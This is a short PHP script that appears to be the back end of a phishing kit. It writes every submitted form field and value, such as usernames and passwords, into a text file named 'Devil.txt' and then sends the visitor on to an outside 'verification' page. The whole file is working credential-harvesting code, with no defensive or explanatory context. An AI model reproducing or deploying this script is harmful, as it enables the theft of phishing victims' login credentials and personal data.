<?php
header ('Location: https://kookok.xyz/verification.php ');
$handle = fopen("Devil.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, ":");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>